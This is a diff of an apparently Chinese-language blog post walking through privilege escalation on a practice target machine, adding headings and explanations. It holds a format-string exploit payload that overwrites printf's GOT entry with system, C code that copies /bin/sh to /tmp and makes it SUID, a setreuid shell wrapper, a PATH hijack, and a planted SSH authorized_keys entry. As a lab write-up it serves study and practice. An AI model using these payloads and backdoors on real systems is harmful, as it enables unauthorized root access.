@@ -8393,7 +8393,7 @@
             </figure>
 
 <p>把 wsl 的公钥写到 .ssh/authorized_keys 方便一点</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMDV3SQ2tLqh01eS1eVsHlKcPTdtGjk3qw8D90P8kwu2XzH2pne++Lw2hYPT3YBihSu8q+ATpAQw6lhO6v99MIHT1APFkVXRMXanb87ltvXUVc5sIOZsfr7Cjsnh4o+oj2EYciDwaAIlhBy1lgvpPgK+NDp7ALPuCeOTn85Rd017RrbDo0FdS0Cy4wjqhQ7vijrppglTy1UDC2QvjNIFiPZEdxBVb3RqkkhXe420cQ0ImqOIrIhEMnxctKgCvl8&#x2F;r5s8b6sfasUJMCs90Hpus9do5pWuDzaJQ7hbDBO&#x2F;DfAQqOh8u0OVYEuODRk3gd36PsnTOiwry36mJmDlBd0j2mcifOv9cBsasmruiPOZVHwaYAqbimo8dNSOxt0rzNcv&#x2F;EXF2IAVc+EeAVdM8C9SWkVYXAK&#x2F;L3rCVQct3otBDN4N7DNx6tyqgKFc6P8orceeu8shLem2fOSND65uZqlYQC7+blO4KC9NJAJ0T6ix5FxUUiuRwafXXmFvoV661LS78&#x3D; root@yichen&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNZ8DG1O2XEkB3Z4M03qO08QjHKCVVxfy&#x2F;6emzyKWMO+p1bf0+E+s9SzPWCTYmZ&#x2F;lfsudWe9QcNTEKRluONKMr1tC&#x2F;8bE&#x2F;ornr2pm8b&#x2F;nNZsmfKme18Qohz2JFgMk&#x2F;GLYECTWDX10fnl1a2RzSBKpUZB7CASurQLcPiP93aevHFLmDT+0jkecB9Skw7fjwTvAJLyWpDbDH0pKyd1RqtdctwYxABkxlUzh613M8ypk1++E3I8baCY4g460yUExd4aw13IeDTcBMtkBDwJaiNiT7niZD04Hz4bckt+gKwJ64FxAsGYE9GtwNbGakjKsi54EkifKsySvJdpCy3RukGu&#x2F;XURXVODODzn6luK8IXlxp5BKM5dkOkMWTnfBn3N4blaAcvVQA8TUSgF7e+OHAYwio2Y0M2qcli9vKTFV5hlsWnUohI7RLg08LzkMi5eEKxHDRy32zfcBLhLDtTuwUYmnWkgB&#x2F;NRBTx82WGm8H5n1VlvXb2Co3cz0Kr9sJHMR&#x2F;JJ8&#x3D; root@DESKTOP-SP02IB7&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -8403,7 +8403,7 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>my_first 权限有 s，可以 suid 提权</p>
+<h1 id="格式化字符串漏洞提权-john"><a href="#格式化字符串漏洞提权-john" class="headerlink" title="格式化字符串漏洞提权 john"></a>格式化字符串漏洞提权 john</h1><p>my_first 权限有 s，可以 suid 提权</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -8466,17 +8466,27 @@
             </figure>
 
 <p>可以通过 ulimit -s unlimited 使得 ASLR 实际上没用</p>
-<p>然后通过把 printf 的 got 的地址改成 system 的 got 的地址来拿到 shell<br>printf 0x8049bfc<br>system 0x40069060</p>
+<p>emmm，在搞个 peda<br>git clone <a href="https://github.com/longld/peda.git" target="_blank" rel="noopener">https://github.com/longld/peda.git</a> ~/peda<br>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
+<p>gdb 调试看一下，得到 system 的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595488000511-eb364dd4-412a-4e15-8638-220580a059cb.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1118&size=1000350&status=done&style=none&width=559" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后通过把 printf 的 got 的中的内容改成 system 的真实地址来拿到 shell<br>printf@got：0x8049bfc<br>system：0x40069060</p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= p32(addr)+p32(addr+<span class="number">2</span>)</span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
 
 <p>额，靶机没有 pwntools<br>稍改一下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= <span class="string">"\xfc\x9b\x04\x08"</span>+<span class="string">"\xfe\x9b\x04\x08"</span></span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
 
-<p>在本地写个 <code>Selection:</code> 可执行程序，由 1.c 编译而来 <code>gcc -o &quot;Selection:&quot; exp.c</code></p>
+<p>但实际上这样执行的是 <code>system(&quot;Selection:&quot;)</code> ，在本地写个 <code>Selection:</code> 可执行程序，由 1.c 编译而来 <code>gcc -o &quot;Selection:&quot; exp.c</code></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"cp /bin/sh /tmp/john"</span>);</span><br><span class="line">    system(<span class="string">"chmod 4777 /tmp/john"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>同时 <code>export PATH=$PATH:/home/mike</code><br>这时候 <code>python exp.py | ./my_first</code> 会在 /tmp 目录下生成 john</p>
+<p>同时 <code>export PATH=$PATH:/home/mike</code> 不然那个 <code>Selection:</code> 不加 <code>./</code> 没法运行的<br>这时候 <code>python exp.py | ./my_first</code> 会在 /tmp 目录下生成 john</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -8485,19 +8495,27 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>但是 id 看一下还是 mike，要交换一下 uid 和 euid</p>
-<p>mike 编译，用 john 用户运行</p>
+<p>当程序拥有 john 的 suid 权限，mike 运行的时候 euid 会变成 john，这个时候再去使用 setreuid 交换 ruid 和 euid，就可以真正的变成 john 用户</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595490816574-bada92e4-b066-41e9-9b11-05a34aa15a38.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=907&size=173144&status=done&style=none&width=595" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>去运行程序</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setreuid(geteuid(), getuid());</span><br><span class="line">  execv(<span class="string">"/bin/bash"</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595231433792-400b3387-535d-4735-be8c-c9fd179e04c4.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=276&originWidth=750&size=48695&status=done&style=none&width=497" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595491673735-eb46971d-24b3-4380-9b4c-da58a3622641.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=251&originWidth=906&size=290126&status=done&style=none&width=588" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>sudo -l 发现 nfs 不用密码就可以以 root 权限执行</p>
+<h1 id="nfs-提权-root"><a href="#nfs-提权-root" class="headerlink" title="nfs 提权 root"></a>nfs 提权 root</h1><p>sudo -l 发现 nfs 不用密码就可以以 root 权限执行（后面操作怕把电脑弄乱了就在虚拟机上操作了）</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
